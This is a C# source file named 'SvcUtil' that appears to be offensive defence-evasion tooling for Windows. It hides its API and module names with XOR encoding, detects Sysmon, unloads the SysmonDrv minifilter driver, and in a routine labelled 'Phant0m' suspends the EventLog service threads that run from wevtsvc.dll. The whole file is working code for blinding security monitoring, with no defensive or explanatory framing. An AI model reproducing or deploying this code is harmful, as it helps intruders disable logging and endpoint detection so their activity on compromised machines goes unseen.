using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace SvcUtil
{
    internal static class Sv
    {
        private static readonly byte[] _xk = { 0xAF, 0x3C, 0x71, 0xE2, 0x59 };

        private static string D(byte[] c)
        {
            byte[] b = new byte[c.Length];
            for (int i = 0; i < c.Length; i++)
                b[i] = (byte)(c[i] ^ _xk[i % _xk.Length]);
            return Encoding.UTF8.GetString(b);
        }

        // ── Encoded module names ───────────────────────────────────

        // "kernel32.dll"
        private static readonly byte[] _k32 =
            { 0xC4, 0x59, 0x03, 0x8C, 0x3C, 0xC3, 0x0F, 0x43,
              0xCC, 0x3D, 0xC3, 0x50 };

        // "ntdll.dll"
        private static readonly byte[] _nd =
            { 0xC1, 0x48, 0x15, 0x8E, 0x35, 0x81, 0x58, 0x1D,
              0x8E };

        // "fltlib.dll"
        private static readonly byte[] _fl =
            { 0xC9, 0x50, 0x05, 0x8E, 0x30, 0xCD, 0x12, 0x15,
              0x8E, 0x35 };

        // ── Encoded API strings ────────────────────────────────────

        // "FilterUnload"
        private static readonly byte[] _s01 =
            { 0xE9, 0x55, 0x1D, 0x96, 0x3C, 0xDD, 0x69, 0x1F,
              0x8E, 0x36, 0xCE, 0x58 };

        // "CreateToolhelp32Snapshot"
        private static readonly byte[] _s02 =
            { 0xEC, 0x4E, 0x14, 0x83, 0x2D, 0xCA, 0x68, 0x1E,
              0x8D, 0x35, 0xC7, 0x59, 0x1D, 0x92, 0x6A, 0x9D,
              0x6F, 0x1F, 0x83, 0x29, 0xDC, 0x54, 0x1E, 0x96 };

        // "Thread32First"
        private static readonly byte[] _s03 =
            { 0xFB, 0x54, 0x03, 0x87, 0x38, 0xCB, 0x0F, 0x43,
              0xA4, 0x30, 0xDD, 0x4F, 0x05 };

        // "Thread32Next"
        private static readonly byte[] _s04 =
            { 0xFB, 0x54, 0x03, 0x87, 0x38, 0xCB, 0x0F, 0x43,
              0xAC, 0x3C, 0xD7, 0x48 };

        // "OpenThread"
        private static readonly byte[] _s05 =
            { 0xE0, 0x4C, 0x14, 0x8C, 0x0D, 0xC7, 0x4E, 0x14,
              0x83, 0x3D };

        // "SuspendThread"
        private static readonly byte[] _s06 =
            { 0xFC, 0x49, 0x02, 0x92, 0x3C, 0xC1, 0x58, 0x25,
              0x8A, 0x2B, 0xCA, 0x5D, 0x15 };

        // "NtQueryInformationThread"
        private static readonly byte[] _s07 =
            { 0xE1, 0x48, 0x20, 0x97, 0x3C, 0xDD, 0x45, 0x38,
              0x8C, 0x3F, 0xC0, 0x4E, 0x1C, 0x83, 0x2D, 0xC6,
              0x53, 0x1F, 0xB6, 0x31, 0xDD, 0x59, 0x10, 0x86 };

        // ── Encoded name strings ───────────────────────────────────

        // "SysmonDrv"
        private static readonly byte[] _n1 =
            { 0xFC, 0x45, 0x02, 0x8F, 0x36, 0xC1, 0x78, 0x03,
              0x94 };

        // "Sysmon64"
        private static readonly byte[] _n2 =
            { 0xFC, 0x45, 0x02, 0x8F, 0x36, 0xC1, 0x0A, 0x45 };

        // "Sysmon"
        private static readonly byte[] _n3 =
            { 0xFC, 0x45, 0x02, 0x8F, 0x36, 0xC1 };

        // "wevtsvc.dll"
        private static readonly byte[] _n4 =
            { 0xD8, 0x59, 0x07, 0x96, 0x2A, 0xD9, 0x5F, 0x5F,
              0x86, 0x35, 0xC3 };

        // ── Constants ──────────────────────────────────────────────

        private const uint _ta = 0x0002;           // THREAD_SUSPEND_RESUME
        private const uint _tq = 0x0040;           // THREAD_QUERY_INFORMATION
        private const uint _ts = 0x00000004;        // TH32CS_SNAPTHREAD
        private const int  _qi = 9;                 // ThreadQuerySetWin32StartAddress

        // ── Delegate types ─────────────────────────────────────────

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        private delegate int D01(string a);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate IntPtr D02(uint a, uint b);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool D03(IntPtr a, IntPtr b);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool D04(IntPtr a, IntPtr b);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate IntPtr D05(uint a, bool b, uint c);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate uint D06(IntPtr a);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int D07(IntPtr a, int b, IntPtr c, int d, IntPtr e);

        // ── Cached delegates ───────────────────────────────────────

        private static D01 _d01;  // FilterUnload
        private static D02 _d02;  // CreateToolhelp32Snapshot
        private static D03 _d03;  // Thread32First
        private static D04 _d04;  // Thread32Next
        private static D05 _d05;  // OpenThread
        private static D06 _d06;  // SuspendThread
        private static D07 _d07;  // NtQueryInformationThread

        private static T RV<T>(byte[] dl, byte[] fn) where T : class
        {
            IntPtr h = W.M0(D(dl));
            if (h == IntPtr.Zero) return null;
            IntPtr p = W.M1(h, D(fn));
            if (p == IntPtr.Zero) return null;
            return (T)(object)Marshal.GetDelegateForFunctionPointer(p, typeof(T));
        }

        // ── R0: Detect ─────────────────────────────────────────────

        /// <summary>
        /// Returns true if Sysmon driver/service is present.
        /// </summary>
        public static bool R0()
        {
            try
            {
                string n64 = D(_n2);
                string n32 = D(_n3);

                var procs = Process.GetProcessesByName(n64);
                if (procs.Length > 0) return true;

                procs = Process.GetProcessesByName(n32);
                if (procs.Length > 0) return true;
            }
            catch { }
            return false;
        }

        // ── R1: Driver unload ──────────────────────────────────────

        /// <summary>
        /// Unload SysmonDrv minifilter via FilterUnload.
        /// Requires elevated. Returns true on success.
        /// </summary>
        public static bool R1()
        {
            try
            {
                if (_d01 == null)
                    _d01 = RV<D01>(_fl, _s01);
                if (_d01 == null) return false;

                int hr = _d01(D(_n1));
                return hr == 0;
            }
            catch { return false; }
        }

        // ── R2: Phant0m ────────────────────────────────────────────

        /// <summary>
        /// Blind EventLog threads servicing wevtsvc.dll.
        /// Suspends threads whose start address falls within
        /// the wevtsvc.dll module range. Requires elevated.
        /// Returns count of suspended threads.
        /// </summary>
        public static int R2()
        {
            int count = 0;

            try
            {
                // Step 1: Find svchost hosting wevtsvc.dll
                int targetPid = 0;
                IntPtr modBase = IntPtr.Zero;
                int modSize = 0;
                string wevt = D(_n4);

                foreach (var proc in Process.GetProcessesByName("svchost"))
                {
                    try
                    {
                        foreach (ProcessModule mod in proc.Modules)
                        {
                            if (mod.ModuleName.Equals(wevt,
                                StringComparison.OrdinalIgnoreCase))
                            {
                                targetPid = proc.Id;
                                modBase = mod.BaseAddress;
                                modSize = mod.ModuleMemorySize;
                                break;
                            }
                        }
                        if (targetPid != 0) break;
                    }
                    catch { }
                }

                if (targetPid == 0 || modBase == IntPtr.Zero)
                    return 0;

                long lo = modBase.ToInt64();
                long hi = lo + modSize;

                // Step 2: Resolve APIs
                if (_d02 == null)
                    _d02 = RV<D02>(_k32, _s02);
                if (_d03 == null)
                    _d03 = RV<D03>(_k32, _s03);
                if (_d04 == null)
                    _d04 = RV<D04>(_k32, _s04);
                if (_d05 == null)
                    _d05 = RV<D05>(_k32, _s05);
                if (_d06 == null)
                    _d06 = RV<D06>(_k32, _s06);
                if (_d07 == null)
                    _d07 = RV<D07>(_nd, _s07);

                if (_d02 == null || _d03 == null || _d04 == null ||
                    _d05 == null || _d06 == null || _d07 == null)
                    return 0;

                // Step 3: Snapshot threads
                IntPtr hSnap = _d02(_ts, 0);
                if (hSnap == IntPtr.Zero || hSnap == new IntPtr(-1))
                    return 0;

                // THREADENTRY32: 28 bytes
                // dwSize(0), cntUsage(4), th32ThreadID(8),
                // th32OwnerProcessID(12), tpBasePri(16),
                // tpDeltaPri(20), dwFlags(24)
                IntPtr te = Marshal.AllocHGlobal(28);

                try
                {
                    Marshal.WriteInt32(te, 0, 28);

                    if (!_d03(hSnap, te))
                    {
                        W.M4(hSnap);
                        return 0;
                    }

                    do
                    {
                        int ownerPid = Marshal.ReadInt32(te, 12);
                        if (ownerPid != targetPid)
                            continue;

                        int tid = Marshal.ReadInt32(te, 8);

                        // Open thread with query + suspend rights
                        IntPtr hThread = _d05(_tq | _ta, false, (uint)tid);
                        if (hThread == IntPtr.Zero)
                            continue;

                        // Query start address
                        IntPtr pAddr = Marshal.AllocHGlobal(IntPtr.Size);
                        try
                        {
                            Marshal.WriteIntPtr(pAddr, IntPtr.Zero);
                            int st = _d07(hThread, _qi, pAddr, IntPtr.Size, IntPtr.Zero);

                            if (st == 0)
                            {
                                long startAddr = Marshal.ReadIntPtr(pAddr).ToInt64();

                                if (startAddr >= lo && startAddr < hi)
                                {
                                    _d06(hThread);
                                    count++;
                                }
                            }
                        }
                        finally
                        {
                            Marshal.FreeHGlobal(pAddr);
                        }

                        W.M4(hThread);

                    } while (_d04(hSnap, te));
                }
                finally
                {
                    Marshal.FreeHGlobal(te);
                    W.M4(hSnap);
                }
            }
            catch { }

            return count;
        }
    }
}
